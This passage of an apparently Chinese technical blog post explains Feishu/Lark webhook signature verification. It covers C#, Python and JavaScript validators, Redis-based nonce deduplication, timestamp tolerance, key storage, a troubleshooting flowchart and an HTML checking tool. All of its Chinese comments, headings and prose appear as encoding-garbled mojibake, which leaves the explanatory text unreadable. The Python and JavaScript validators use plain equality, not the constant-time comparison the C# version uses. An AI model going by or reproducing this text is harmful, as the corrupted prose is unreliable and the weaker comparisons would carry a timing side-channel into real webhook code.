<pre><code class="language-csharp">public async Task&lt;bool&gt; ValidateSignature(
    long timestamp, 
    string nonce, 
    string body, 
    string headerSignature, 
    string encryptKey)
{
    try
    {
        // ========== ç¬¬ 1 æ­¥ï¼åºç¡éªè¯ ==========
        
        // æ£æ¥å¿è¦åæ°
        if (string.IsNullOrEmpty(headerSignature))
        {
            _logger.LogWarning("è¯·æ±å¤´ä¸­ç¼ºå° X-Lark-Signature");
            return false;
        }
        
        if (timestamp == 0 || string.IsNullOrEmpty(nonce))
        {
            _logger.LogWarning("æ¶é´æ³æ nonce ä¸ºç©º");
            return false;
        }
        
        // ========== ç¬¬ 2 æ­¥ï¼é²éæ¾æ»å» ==========
        
        // æ£æ¥ nonce æ¯å¦å·²ä½¿ç¨ï¼éè¦éå Redis ç­ç¼å­å®ç°ï¼
        if (await IsNonceUsed(nonce))
        {
            _logger.LogWarning("Nonce {Nonce} å·²ä½¿ç¨è¿ï¼æç»éæ¾æ»å»", nonce);
            return false;
        }
        
        // éªè¯æ¶é´æ³ï¼å®¹é 60 ç§ï¼
        if (!IsTimestampValid(timestamp, toleranceSeconds: 60))
        {
            _logger.LogWarning("è¯·æ±æ¶é´æ³æ æ: {Timestamp}", timestamp);
            return false;
        }
        
        // ========== ç¬¬ 3 æ­¥ï¼æå»ºç­¾åå­ç¬¦ä¸² ==========
        
        // æ³¨æï¼ç´æ¥æ¼æ¥ï¼æ åéç¬¦
        var signString = $"{timestamp}{nonce}{encryptKey}{body}";
        
        // è°è¯æ¥å¿ï¼çäº§ç¯å¢å»ºè®®å³é­ï¼
        _logger.LogDebug("ç­¾åå­ç¬¦ä¸²å 100 å­ç¬¦: {SignStringPrefix}", 
            signString.Substring(0, Math.Min(100, signString.Length)));
        
        // ========== ç¬¬ 4 æ­¥ï¼è®¡ç® SHA-256 åå¸ ==========
        
        using var sha256 = SHA256.Create();
        var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));
        
        // ========== ç¬¬ 5 æ­¥ï¼è½¬æ¢ä¸ºå°ååå­è¿å¶å­ç¬¦ä¸² ==========
        
        var computedSignature = BitConverter.ToString(hashBytes)
            .Replace("-", "")
            .ToLower();
        
        _logger.LogDebug("è®¡ç®çç­¾å: {ComputedSignature}", computedSignature);
        _logger.LogDebug("ææçç­¾å: {ExpectedSignature}", headerSignature);
        
        // ========== ç¬¬ 6 æ­¥ï¼åºå®æ¶é´æ¯è¾ ==========
        
        // ä½¿ç¨åºå®æ¶é´æ¯è¾é²æ­¢è®¡æ¶æ»å»
        var isValid = FixedTimeEquals(computedSignature, headerSignature);
        
        if (isValid)
        {
            _logger.LogInformation("ç­¾åéªè¯æå");
            // æ è®° nonce ä¸ºå·²ä½¿ç¨
            await MarkNonceAsUsed(nonce);
        }
        else
        {
            _logger.LogWarning("ç­¾åéªè¯å¤±è´¥");
        }
        
        return isValid;
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "éªè¯ç­¾åæ¶åçéè¯¯");
        return false;
    }
}

/// &lt;summary&gt;
/// åºå®æ¶é´æ¯è¾ï¼é²æ­¢è®¡æ¶æ»å»
/// &lt;/summary&gt;
private static bool FixedTimeEquals(string a, string b)
{
    if (a.Length != b.Length)
        return false;
    
    var result = 0;
    for (var i = 0; i &lt; a.Length; i++)
    {
        result |= a[i] ^ b[i];
    }
    
    return result == 0;
}

/// &lt;summary&gt;
/// éªè¯æ¶é´æ³æ¯å¦å¨ææèå´å
/// &lt;/summary&gt;
private bool IsTimestampValid(long timestamp, int toleranceSeconds)
{
    var requestTime = DateTimeOffset.FromUnixTimeSeconds(timestamp);
    var now = DateTimeOffset.UtcNow;
    var diff = Math.Abs((now - requestTime).TotalSeconds);
    
    return diff &lt;= toleranceSeconds;
}
</code></pre>
<h3 id="å¶ä»è¯­è¨å®ç°åè">å¶ä»è¯­è¨å®ç°åè</h3>
<h4 id="python-å®ç°">Python å®ç°</h4>
<pre><code class="language-python">import hashlib
import time

def validate_signature(timestamp, nonce, body, header_signature, encrypt_key):
    """éªè¯é£ä¹¦ Webhook ç­¾å"""
    
    # 1. åºç¡éªè¯
    if not header_signature or not nonce or timestamp == 0:
        return False
    
    # 2. æ¶é´æ³éªè¯ï¼å®¹é 60 ç§ï¼
    current_time = int(time.time())
    if abs(current_time - timestamp) &gt; 60:
        return False
    
    # 3. æå»ºç­¾åå­ç¬¦ä¸²ï¼ç´æ¥æ¼æ¥ï¼
    sign_string = f"{timestamp}{nonce}{encrypt_key}{body}"
    
    # 4. è®¡ç® SHA-256 åå¸
    hash_obj = hashlib.sha256(sign_string.encode('utf-8'))
    
    # 5. è½¬æ¢ä¸ºå°ååå­è¿å¶
    computed_signature = hash_obj.hexdigest().lower()
    
    # 6. æ¯è¾ç­¾å
    return computed_signature == header_signature.lower()
</code></pre>
<h4 id="javascriptnodejs-å®ç°">JavaScript/Node.js å®ç°</h4>
<pre><code class="language-javascript">const crypto = require('crypto');

function validateSignature(timestamp, nonce, body, headerSignature, encryptKey) {
    // 1. åºç¡éªè¯
    if (!headerSignature || !nonce || !timestamp) {
        return false;
    }
    
    // 2. æ¶é´æ³éªè¯ï¼å®¹é 60 ç§ï¼
    const currentTime = Math.floor(Date.now() / 1000);
    if (Math.abs(currentTime - timestamp) &gt; 60) {
        return false;
    }
    
    // 3. æå»ºç­¾åå­ç¬¦ä¸²ï¼ç´æ¥æ¼æ¥ï¼
    const signString = `${timestamp}${nonce}${encryptKey}${body}`;
    
    // 4. è®¡ç® SHA-256 åå¸å¹¶è½¬æ¢ä¸ºå°ååå­è¿å¶
    const computedSignature = crypto
        .createHash('sha256')
        .update(signString, 'utf8')
        .digest('hex')
        .toLowerCase();
    
    // 5. æ¯è¾ç­¾å
    return computedSignature === headerSignature.toLowerCase();
}
</code></pre>
<hr>
<h2 id="å®å¨é²æ¤çèºæ¯">å®å¨é²æ¤çèºæ¯</h2>
<p>ç­¾åéªè¯åªæ¯å®å¨é²æ¤çç¬¬ä¸æ­¥ãè¦æå»ºä¸ä¸ªçæ­£å®å¨å¯é ç Webhook æå¡ï¼è¿éè¦èèæ´å¤ç»èã</p>
<h3 id="é²éæ¾æ»å»nonce-å»éæºå¶">é²éæ¾æ»å»ï¼Nonce å»éæºå¶</h3>
<h4 id="ä»ä¹æ¯éæ¾æ»å»">ä»ä¹æ¯éæ¾æ»å»ï¼</h4>
<p>æ³è±¡è¿æ ·ä¸ä¸ªåºæ¯ï¼</p>
<pre><code>1. é»å®¢æªè·äºä¸ä¸ªåæ³çé£ä¹¦è¯·æ±
2. é»å®¢éå¤åéè¿ä¸ªè¯·æ± 100 æ¬¡
3. ä½ çæå¡å¨å¤çäº 100 æ¬¡ç¸åçäºä»¶
4. ð¥ ä¸å¡é»è¾è¢«éå¤æ§è¡ï¼é ææ°æ®æ··ä¹±
</code></pre>
<h4 id="å¦ä½é²æ­¢">å¦ä½é²æ­¢ï¼</h4>
<p>ä½¿ç¨ <strong>Nonceï¼Number used onceï¼</strong> æºå¶ï¼</p>
<div class="mermaid">sequenceDiagram
    participant Client as å®¢æ·ç«¯
    participant Server as æå¡å¨
    participant Redis as Redis ç¼å­
    
    Note over Client,Redis: Nonce å»éæµç¨
    
    Client-&gt;&gt;Server: åéè¯·æ± (Nonce: 149323894)
    Server-&gt;&gt;Server: æå Nonce: 149323894
    Server-&gt;&gt;Redis: EXISTS "feishu:nonce:149323894"
    
    alt Nonce å·²å­å¨
        Redis--&gt;&gt;Server: è¿å true
        Server--&gt;&gt;Client: â æç»è¯·æ±ï¼éæ¾æ»å»ï¼
    else Nonce ä¸å­å¨
        Redis--&gt;&gt;Server: è¿å false
        Server-&gt;&gt;Server: â ç»§ç»­å¤ç
        Server-&gt;&gt;Redis: SET "feishu:nonce:149323894" "1" EX 300
        Note over Redis: 5 åéåèªå¨è¿æ
        Server--&gt;&gt;Client: è¿åå¤çç»æ
    end
</div><h4 id="ä»£ç å®ç°ä½¿ç¨-redis">ä»£ç å®ç°ï¼ä½¿ç¨ Redisï¼</h4>
<pre><code class="language-csharp">public class NonceDeduplicator
{
    private readonly IDistributedCache _cache;
    private readonly ILogger&lt;NonceDeduplicator&gt; _logger;
    
    public async Task&lt;bool&gt; IsNonceUsed(string nonce)
    {
        var key = $"feishu:nonce:{nonce}";
        var value = await _cache.GetStringAsync(key);
        return value != null;
    }
    
    public async Task MarkNonceAsUsed(string nonce)
    {
        var key = $"feishu:nonce:{nonce}";
        var options = new DistributedCacheEntryOptions
        {
            // 5 åéåèªå¨è¿æï¼ä¸æ¶é´æ³å®¹éæ¶é´ä¸è´ï¼
            AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(5)
        };
        
        await _cache.SetStringAsync(key, "1", options);
        _logger.LogDebug("Nonce {Nonce} å·²æ è®°ä¸ºå·²ä½¿ç¨", nonce);
    }
}
</code></pre>
<h3 id="é²éæ¾æ»å»æ¶é´æ³éªè¯">é²éæ¾æ»å»ï¼æ¶é´æ³éªè¯</h3>
<h4 id="ä¸ºä»ä¹éè¦æ¶é´æ³éªè¯">ä¸ºä»ä¹éè¦æ¶é´æ³éªè¯ï¼</h4>
<pre><code>åºæ¯ 1ï¼ç½ç»å»¶è¿
é£ä¹¦åéæ¶é´ï¼14:00:00
å°è¾¾ä½ æå¡å¨ï¼14:00:05
â 5 ç§å»¶è¿ï¼å¯ä»¥æ¥å

åºæ¯ 2ï¼æ¶ææ»å»
é£ä¹¦åéæ¶é´ï¼14:00:00
é»å®¢éæ¾æ¶é´ï¼15:00:00
â 1 å°æ¶å»¶è¿ï¼ææ¾å¼å¸¸
</code></pre>
<h4 id="å®¹éæ¶é´è®¾ç½®å»ºè®®">å®¹éæ¶é´è®¾ç½®å»ºè®®</h4>
<table>
<thead>
<tr>
<th>ç¯å¢</th>
<th>å»ºè®®å®¹éæ¶é´</th>
<th>åå </th>
</tr>
</thead>
<tbody>
<tr>
<td>çäº§ç¯å¢</td>
<td>60 ç§</td>
<td>å¹³è¡¡å®å¨æ§åå¯ç¨æ§</td>
</tr>
<tr>
<td>æµè¯ç¯å¢</td>
<td>300 ç§</td>
<td>æ¹ä¾¿è°è¯</td>
</tr>
<tr>
<td>å¼åç¯å¢</td>
<td>600 ç§</td>
<td>æ¬å°æ¶é´å¯è½ä¸å</td>
</tr>
</tbody>
</table>
<h4 id="ä»£ç å®ç°">ä»£ç å®ç°</h4>
<pre><code class="language-csharp">public bool IsTimestampValid(long timestamp, int toleranceSeconds = 60)
{
    // é£ä¹¦çæ¶é´æ³æ¯ç§çº§ç
    var requestTime = DateTimeOffset.FromUnixTimeSeconds(timestamp);
    var now = DateTimeOffset.UtcNow;
    
    // è®¡ç®æ¶é´å·®ï¼ç»å¯¹å¼ï¼
    var diff = Math.Abs((now - requestTime).TotalSeconds);
    
    if (diff &gt; toleranceSeconds)
    {
        _logger.LogWarning(
            "æ¶é´æ³è¶åºå®¹éèå´: è¯·æ±æ¶é´ {RequestTime}, å½åæ¶é´ {CurrentTime}, å·®å¼ {Diff}ç§",
            requestTime, now, diff);
        return false;
    }
    
    return true;
}
</code></pre>
<h3 id="é²éæ¾æ»å»å¯é¥ç®¡ç">é²éæ¾æ»å»ï¼å¯é¥ç®¡ç</h3>
<h4 id="-å±é©çåæ³">â å±é©çåæ³</h4>
<pre><code class="language-csharp">// åä¸ä¸è¦è¿æ ·åï¼
public class FeishuConfig
{
    public const string EncryptKey = "go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx";
    public const string VerificationToken = "fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf";
}
</code></pre>
<p><strong>ä¸ºä»ä¹å±é©ï¼</strong></p>
<ul>
<li>ä»£ç ä¼è¢«æäº¤å° Git ä»åº</li>
<li>ä»»ä½è½çå°ä»£ç çäººé½è½çå°å¯é¥</li>
<li>å¯é¥æ³é²åå¾é¾è¿½è¸ª</li>
</ul>
<h4 id="-å®å¨çåæ³">â å®å¨çåæ³</h4>
<p><strong>æ¹æ¡ 1ï¼ä½¿ç¨ç¯å¢åé</strong></p>
<pre><code class="language-csharp">// appsettings.jsonï¼ä¸åå«ææä¿¡æ¯ï¼
{
  "FeishuWebhook": {
    "RoutePrefix": "feishu/webhook"
  }
}

// ç¯å¢åéï¼å¨æå¡å¨ä¸éç½®ï¼
FEISHU_ENCRYPT_KEY=go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx
FEISHU_VERIFICATION_TOKEN=fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf

// ä»£ç ä¸­è¯»å
var encryptKey = Environment.GetEnvironmentVariable("FEISHU_ENCRYPT_KEY");
</code></pre>
<p><strong>æ¹æ¡ 2ï¼ä½¿ç¨å¯é¥ç®¡çæå¡</strong></p>
<pre><code class="language-csharp">// ä½¿ç¨ Azure Key Vault
var client = new SecretClient(vaultUri, new DefaultAzureCredential());
var secret = await client.GetSecretAsync("feishu-encrypt-key");
var encryptKey = secret.Value.Value;

// ä½¿ç¨ AWS Secrets Manager
var client = new AmazonSecretsManagerClient();
var request = new GetSecretValueRequest { SecretId = "feishu/encrypt-key" };
var response = await client.GetSecretValueAsync(request);
var encryptKey = response.SecretString;
</code></pre>
<h3 id="é²éæ¾æ»å»å¤åºç¨åºæ¯">é²éæ¾æ»å»ï¼å¤åºç¨åºæ¯</h3>
<p>å¦æä½ çå¬å¸æå¤ä¸ªé£ä¹¦åºç¨ï¼å¯ä»¥è®©å®ä»¬å±äº«ä¸ä¸ª Webhook ç«¯ç¹ï¼</p>
<div class="mermaid">graph TB
    subgraph "å¤åºç¨éç½®ç¤ºä¾"
        A["åºç¨ A&lt;br/&gt;(cli_a98ea7d1a0ba100b)"]
        B["åºç¨ B&lt;br/&gt;(cli_b12345678901234c)"]
        C["åºç¨ C&lt;br/&gt;(cli_c98765432109876d)"]
        
        A --&gt; A1["Encrypt Key:&lt;br/&gt;go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx"]
        A --&gt; A2["Verification Token:&lt;br/&gt;fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf"]
        
        B --&gt; B1["Encrypt Key:&lt;br/&gt;xY9zAbCdEfGhIjKlMnOpQrStUvWx1234"]
        B --&gt; B2["Verification Token:&lt;br/&gt;gHt9ypcqPLec5zB1VpLKsiOUVbYUaKog"]
        
        C --&gt; C1["Encrypt Key:&lt;br/&gt;1234AbCdEfGhIjKlMnOpQrStUvWxYz56"]
        C --&gt; C2["Verification Token:&lt;br/&gt;hJu0zqdqQMfd6aC2WqMLtjPVWcZVbLph"]
    end
    
    style A fill:#e3f2fd
    style B fill:#f3e5f5
    style C fill:#e8f5e9
</div><h4 id="éç½®æä»¶">éç½®æä»¶</h4>
<pre><code class="language-json">{
  "FeishuWebhook": {
    "MultiAppEncryptKeys": {
      "cli_a98ea7d1a0ba100b": "go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx",
      "cli_b12345678901234c": "xY9zAbCdEfGhIjKlMnOpQrStUvWx1234",
      "cli_c98765432109876d": "1234AbCdEfGhIjKlMnOpQrStUvWxYz56"
    },
    "DefaultAppId": "cli_a98ea7d1a0ba100b"
  }
}
</code></pre>
<h4 id="ä»£ç å®ç°-1">ä»£ç å®ç°</h4>
<pre><code class="language-csharp">private string GetEncryptKey(string appId)
{
    // å°è¯ä»å¤åºç¨éç½®ä¸­è·å
    if (_options.MultiAppEncryptKeys.TryGetValue(appId, out var key))
    {
        _logger.LogDebug("ä½¿ç¨åºç¨ {AppId} çä¸ç¨å¯é¥", appId);
        return key;
    }
    
    // åéå°é»è®¤å¯é¥
    if (!string.IsNullOrEmpty(_options.DefaultAppId) &amp;&amp;
        _options.MultiAppEncryptKeys.TryGetValue(_options.DefaultAppId, out var defaultKey))
    {
        _logger.LogWarning("æªæ¾å°åºç¨ {AppId} çå¯é¥ï¼ä½¿ç¨é»è®¤å¯é¥", appId);
        return defaultKey;
    }
    
    // æååéå°ä¸»å¯é¥
    _logger.LogWarning("ä½¿ç¨ä¸»å¯é¥");
    return _options.EncryptKey;
}
</code></pre>
<hr>
<h2 id="é®é¢ææ¥æå">é®é¢ææ¥æå</h2>
<p>å½ç­¾åéªè¯å¤±è´¥æ¶ï¼ä¸è¦æå¼ ãæç§è¿ä¸ªæ¸åéé¡¹æ£æ¥ï¼99% çé®é¢é½è½æ¾å°åå ã</p>
<h3 id="ææ¥æ¸å">ææ¥æ¸å</h3>
<div class="mermaid">flowchart TD
    Start([ç­¾åéªè¯å¤±è´¥]) --&gt; Check1{ç¬¬ 1 æ­¥ï¼æ£æ¥å¯é¥éç½®}
    
    Check1 --&gt; Q1a[Encrypt Key æ¯å¦æ­£ç¡®?]
    Check1 --&gt; Q1b[é¿åº¦æ¯å¦ä¸º 32 å­ç¬¦?]
    Check1 --&gt; Q1c[æ¯å¦æå¤ä½çç©ºæ ¼ææ¢è¡ç¬¦?]
    Check1 --&gt; Q1d[æ¯å¦ä½¿ç¨äº Verification Token?]
    
    Q1a --&gt; |æé®é¢| Fix1[ä¿®æ­£å¯é¥]
    Q1b --&gt; |æé®é¢| Fix1
    Q1c --&gt; |æé®é¢| Fix1
    Q1d --&gt; |æé®é¢| Fix1
    
    Q1a --&gt; |æ­£å¸¸| Check2{ç¬¬ 2 æ­¥ï¼æ£æ¥ç­¾åå­ç¬¦ä¸²æå»º}
    Q1b --&gt; |æ­£å¸¸| Check2
    Q1c --&gt; |æ­£å¸¸| Check2
    Q1d --&gt; |æ­£å¸¸| Check2
    
    Check2 --&gt; Q2a[æ¯å¦ç´æ¥æ¼æ¥?]
    Check2 --&gt; Q2b[é¡ºåºæ¯å¦æ­£ç¡®?]
    Check2 --&gt; Q2c[body æ¯å¦ä¸ºåå§è¯·æ±ä½?]
    Check2 --&gt; Q2d[æ¯å¦åå«äº Encrypt Key?]
    
    Q2a --&gt; |æé®é¢| Fix2[ä¿®æ­£æ¼æ¥æ¹å¼]
    Q2b --&gt; |æé®é¢| Fix2
    Q2c --&gt; |æé®é¢| Fix2
    Q2d --&gt; |æé®é¢| Fix2
    
    Q2a --&gt; |æ­£å¸¸| Check3{ç¬¬ 3 æ­¥ï¼æ£æ¥ç­¾åç®æ³}
    Q2b --&gt; |æ­£å¸¸| Check3
    Q2c --&gt; |æ­£å¸¸| Check3
    Q2d --&gt; |æ­£å¸¸| Check3
    
    Check3 --&gt; Q3a[æ¯å¦ä½¿ç¨ SHA-256?]
    Check3 --&gt; Q3b[è¾åºæ ¼å¼æ¯å¦ä¸ºå°ååå­è¿å¶?]
    
    Q3a --&gt; |æé®é¢| Fix3[ä¿®æ­£ç®æ³]
    Q3b --&gt; |æé®é¢| Fix3
    
    Q3a --&gt; |æ­£å¸¸| Check4{ç¬¬ 4 æ­¥ï¼æ£æ¥æ¶é´æ³å Nonce}
    Q3b --&gt; |æ­£å¸¸| Check4
    
    Check4 --&gt; Q4a[æ¶é´æ³æ¯å¦å¨ææèå´å?]
    Check4 --&gt; Q4b[æå¡å¨æ¶é´æ¯å¦åç¡®?]
    Check4 --&gt; Q4c[Nonce æ¯å¦è¢«è¯¯æ è®°?]
    
    Q4a --&gt; |æé®é¢| Fix4[ä¿®æ­£æ¶é´ç¸å³é®é¢]
    Q4b --&gt; |æé®é¢| Fix4
    Q4c --&gt; |æé®é¢| Fix4
    
    Q4a --&gt; |æ­£å¸¸| Success[â é®é¢å·²è§£å³]
    Q4b --&gt; |æ­£å¸¸| Success
    Q4c --&gt; |æ­£å¸¸| Success
    
    Fix1 --&gt; Retry[éæ°æµè¯]
    Fix2 --&gt; Retry
    Fix3 --&gt; Retry
    Fix4 --&gt; Retry
    
    Retry --&gt; Start
    
    style Check1 fill:#e3f2fd
    style Check2 fill:#f3e5f5
    style Check3 fill:#e8f5e9
    style Check4 fill:#fff3e0
    style Success fill:#c8e6c9
    style Fix1 fill:#ffebee
    style Fix2 fill:#ffebee
    style Fix3 fill:#ffebee
    style Fix4 fill:#ffebee
</div><h3 id="ææ¥æå·§">ææ¥æå·§</h3>
<h4 id="æå·§-1æå°å³é®ä¿¡æ¯">æå·§ 1ï¼æå°å³é®ä¿¡æ¯</h4>
<pre><code class="language-csharp">_logger.LogDebug("========== ç­¾åéªè¯è°è¯ä¿¡æ¯ ==========");
_logger.LogDebug("Timestamp: {Timestamp}", timestamp);
_logger.LogDebug("Nonce: {Nonce}", nonce);
_logger.LogDebug("Encrypt Key å 8 ä½: {KeyPrefix}", 
    encryptKey.Substring(0, 8));
_logger.LogDebug("Body é¿åº¦: {BodyLength}", body.Length);
_logger.LogDebug("Body å 100 å­ç¬¦: {BodyPrefix}", 
    body.Substring(0, Math.Min(100, body.Length)));
_logger.LogDebug("ç­¾åå­ç¬¦ä¸²å 150 å­ç¬¦: {SignStringPrefix}", 
    signString.Substring(0, Math.Min(150, signString.Length)));
_logger.LogDebug("è®¡ç®çç­¾å: {ComputedSignature}", computedSignature);
_logger.LogDebug("ææçç­¾å: {ExpectedSignature}", headerSignature);
_logger.LogDebug("========================================");
</code></pre>
<h4 id="æå·§-2ä½¿ç¨å¨çº¿å·¥å·éªè¯">æå·§ 2ï¼ä½¿ç¨å¨çº¿å·¥å·éªè¯</h4>
<p>ä½ å¯ä»¥åå»ºä¸ä¸ªç®åçå¨çº¿å·¥å·æ¥éªè¯ç­¾åè®¡ç®ï¼</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;é£ä¹¦ç­¾åéªè¯å·¥å·&lt;/title&gt;
    &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;é£ä¹¦ç­¾åéªè¯å·¥å·&lt;/h1&gt;
    
    &lt;label&gt;Timestamp:&lt;/label&gt;
    &lt;input type="text" id="timestamp" placeholder="1768550348"&gt;&lt;br&gt;
    
    &lt;label&gt;Nonce:&lt;/label&gt;
    &lt;input type="text" id="nonce" placeholder="149323894"&gt;&lt;br&gt;
    
    &lt;label&gt;Encrypt Key:&lt;/label&gt;
    &lt;input type="text" id="encryptKey" placeholder="32ä½å¯é¥"&gt;&lt;br&gt;
    
    &lt;label&gt;Body:&lt;/label&gt;
    &lt;textarea id="body" rows="5" placeholder='{"encrypt":"..."}'&gt;&lt;/textarea&gt;&lt;br&gt;
    
    &lt;button onclick="calculate()"&gt;è®¡ç®ç­¾å&lt;/button&gt;
    
    &lt;h3&gt;ç»æï¼&lt;/h3&gt;
    &lt;div id="result"&gt;&lt;/div&gt;
    
    &lt;script&gt;
    function calculate() {
        const timestamp = document.getElementById('timestamp').value;
        const nonce = document.getElementById('nonce').value;
        const encryptKey = document.getElementById('encryptKey').value;
        const body = document.getElementById('body').value;
        
        // æå»ºç­¾åå­ç¬¦ä¸²
        const signString = timestamp + nonce + encryptKey + body;
        
        // è®¡ç® SHA-256
        const hash = CryptoJS.SHA256(signString);
        const signature = hash.toString(CryptoJS.enc.Hex).toLowerCase();
        
        // æ¾ç¤ºç»æ
        document.getElementById('result').innerHTML = `
            &lt;p&gt;&lt;strong&gt;ç­¾åå­ç¬¦ä¸²å 100 å­ç¬¦ï¼&lt;/strong&gt;&lt;br&gt;
            ${signString.substring(0, 100)}...&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;è®¡ç®çç­¾åï¼&lt;/strong&gt;&lt;br&gt;
            &lt;code style="color: green; font-size: 14px;"&gt;${signature}&lt;/code&gt;&lt;/p&gt;
        `;
    }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h4 id="æå·§-3ååæµè¯">æå·§ 3ï¼ååæµè¯</h4>
<pre><code class="language-csharp">[Fact]
public async Task ValidateSignature_WithCorrectData_ShouldReturnTrue()
{
    // Arrange
    var timestamp = 1768550348L;
    var nonce = "149323894";
    var encryptKey = "go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx";
    var body = "{\"encrypt\":\"Ul/tHTDEQkOlKZuqYTS7t...\"}";
    
    // æå¨è®¡ç®ææçç­¾å
    var signString = $"{timestamp}{nonce}{encryptKey}{body}";
    using var sha256 = SHA256.Create();
    var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));
    var expectedSignature = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
    
    // Act
    var result = await _validator.ValidateSignature(
        timestamp, nonce, body, expectedSignature, encryptKey);
    
    // Assert
    Assert.True(result);
}
</code></pre>
<h3 id="ææ¥éæ¥è¡¨">ææ¥éæ¥è¡¨</h3>
<table>
<thead>
<tr>
<th>éè¯¯ç°è±¡</th>
<th>å¯è½åå </th>
<th>è§£å³æ¹æ¡</th>
<th>ä¼åçº§</th>
</tr>
</thead>
<tbody>
<tr>
<td>ç­¾åä¸å¹é</td>
<td>ä½¿ç¨äº HMAC-SHA256</td>
<td>æ¹ç¨çº¯ SHA-256</td>
<td>â­â­â­</td>
</tr>
<tr>
<td>ç­¾åä¸å¹é</td>
<td>ç­¾åå­ç¬¦ä¸²ææ¢è¡ç¬¦</td>
<td>ç´æ¥æ¼æ¥ï¼æ åéç¬¦</td>
<td>â­â­â­</td>
</tr>
<tr>
<td>ç­¾åä¸å¹é</td>
<td>ä½¿ç¨äº Verification Token</td>
<td>æ¹ç¨ Encrypt Key</td>
<td>â­â­â­</td>
</tr>
<tr>
<td>ç­¾åä¸å¹é</td>
<td>è¾åºæ ¼å¼ä¸º Base64</td>
<td>æ¹ç¨å°ååå­è¿å¶</td>
<td>â­â­â­</td>
</tr>
<tr>
<td>ç­¾åä¸å¹é</td>
<td>ç­¾åå­ç¬¦ä¸²ç¼ºå° Encrypt Key</td>
<td>æ·»å  Encrypt Key</td>
<td>â­â­â­</td>
</tr>
<tr>
<td>æ¶é´æ³æ æ</td>
<td>æå¡å¨æ¶é´ä¸åæ­¥</td>
<td>åæ­¥æå¡å¨æ¶é´</td>
<td>â­â­</td>
</tr>
<tr>
<td>Nonce éå¤</td>
<td>Redis ç¼å­éç½®éè¯¯</td>
<td>æ£æ¥ Redis è¿æ¥</td>
<td>â­â­</td>
</tr>
<tr>
<td>è§£å¯æåä½ç­¾åå¤±è´¥</td>
<td>å¯é¥éç½®æ··ä¹±</td>
<td>ç¡®è®¤ä½¿ç¨æ­£ç¡®çå¯é¥</td>
<td>â­â­</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="æ»ç»ä¸æè">æ»ç»ä¸æè</h2>
<h3 id="æ ¸å¿è¦ç¹åé¡¾">æ ¸å¿è¦ç¹åé¡¾</h3>
<p>è®©æç¨ä¸å¼ å¾æ»ç»é£ä¹¦ç­¾åéªè¯çæ ¸å¿è¦ç¹ï¼</p>
<div class="mermaid">mindmap
  root((é£ä¹¦ Webhook&lt;br/&gt;ç­¾åéªè¯æ ¸å¿è¦ç¹))
    1ï¸â£ ç­¾åç®æ³
      â SHA-256
      â HMAC-SHA256
    2ï¸â£ ç­¾åå­ç¬¦ä¸²
      â ç´æ¥æ¼æ¥
      timestamp + nonce + encryptKey + body
      â ä½¿ç¨æ¢è¡ç¬¦åé
    3ï¸â£ ä½¿ç¨çå¯é¥
      â Encrypt Key
      â Verification Token
    4ï¸â£ è¾åºæ ¼å¼
      â å°ååå­è¿å¶
      f2d909fb...
      â Base64 ç¼ç 
    5ï¸â£ å®å¨é²æ¤
      â Nonce å»é
      â æ¶é´æ³éªè¯
      â åºå®æ¶é´æ¯è¾
      â å¯é¥å®å¨å­å¨
</div><h3 id="å¯¹æ¯å¶ä»å¹³å°">å¯¹æ¯å¶ä»å¹³å°</h3>
<p>ä¸ºäºå¸®å©ä½ æ´å¥½å°çè§£ï¼ææ´çäºå ä¸ªä¸»æµå¹³å°çç­¾åéªè¯å¯¹æ¯ï¼</p>
<table>
<thead>
<tr>
<th>å¹³å°</th>
<th>ç­¾åç®æ³</th>
<th>å¯é¥ç±»å</th>
<th>å­ç¬¦ä¸²æ ¼å¼</th>
<th>è¾åºæ ¼å¼</th>
<th>åéç¬¦</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>é£ä¹¦</strong></td>
<td>SHA-256</td>
<td>Encrypt Key</td>
<td>timestamp+nonce+key+body</td>
<td>å°å Hex</td>
<td>æ </td>
</tr>
<tr>
<td>å¾®ä¿¡</td>
<td>SHA-1</td>
<td>Token</td>
<td>å­å¸åºæåºåæ¼æ¥</td>
<td>å°å Hex</td>
<td>æ </td>
</tr>
<tr>
<td>éé</td>
<td>HMAC-SHA256</td>
<td>App Secret</td>
<td>timestamp+\n+secret</td>
<td>Base64</td>
<td>\n</td>
</tr>
<tr>
<td>ä¼ä¸å¾®ä¿¡</td>
<td>SHA-256</td>
<td>Token</td>
<td>å­å¸åºæåºåæ¼æ¥</td>
<td>å°å Hex</td>
<td>æ </td>
</tr>
<tr>
<td>Slack</td>
<td>HMAC-SHA256</td>
<td>Signing Secret</td>
<td>version:timestamp:body</td>
<td>Hex</td>
<td>:</td>
</tr>
</tbody>
</table>
<p><strong>å³é®åç°ï¼</strong></p>
<ul>
<li>é£ä¹¦åå¾®ä¿¡é½ç¨çº¯åå¸ï¼SHAï¼ï¼ä¸ç¨ HMAC</li>
<li>ééå Slack ç¨ HMAC-SHA256</li>
<li>å¤§é¨åå¹³å°è¾åºåå­è¿å¶ï¼åªæééç¨ Base64</li>
<li>é£ä¹¦çç¹æ®ä¹å¤ï¼ç­¾åå­ç¬¦ä¸²ä¸­åå«å¯é¥æ¬èº«</li>
</ul>
<h3 id="ææ¥ç»éªæ»ç»">ææ¥ç»éªæ»ç»</h3>
<p>ç»è¿è¿æ¬¡è¸©åç»åï¼ææ»ç»äºå ç¹ç»éªï¼</p>
